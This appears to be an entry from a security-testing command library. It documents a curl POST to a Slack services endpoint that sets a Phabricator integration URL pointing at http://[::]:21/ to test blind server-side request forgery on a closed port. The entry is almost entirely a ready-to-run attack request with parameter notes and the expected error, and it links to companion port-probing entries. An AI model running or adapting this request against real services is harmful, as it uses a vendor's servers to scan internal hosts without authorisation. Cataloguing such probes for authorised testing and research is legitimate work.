---
data: >-
  curl -X POST https://agarri.slack.com/services/4836378801 -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "edit_service=1&edit_label=1&phabricator_url=http://[::]:21/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1"
tags:
  - ssrf
  - phabricator
  - blind
type: command
output: HTTP/1.1 500 Server Error
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.341Z'
id: f6b17f1f-b152-4c08-bb0a-2d00fbb9e4f9
verified: false
validated: true
submitted: true
---
# configure-phabricator-ssrf-integration-closed-port

## Command

```bash
curl -X POST https://agarri.slack.com/services/4836378801 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "edit_service=1&edit_label=1&phabricator_url=http://[::]:21/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1"
```

## Description

Tests blind SSRF on closed port 21 in Phabricator integration, expecting failure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `phabricator_url` | URL with closed port | Yes |
| Others same as open port | | Yes |

## Examples

### Basic Usage

```bash
curl -X POST ... -d "phabricator_url=http://[::]:21/&..."
```

## Expected Output

500 error from connection failure.

## Related

- [[commands/configure-phabricator-ssrf-integration-open-port]]
- [[procedures/Test-Phabricator-with-Closed-Port-for-Blind-SSRF]]
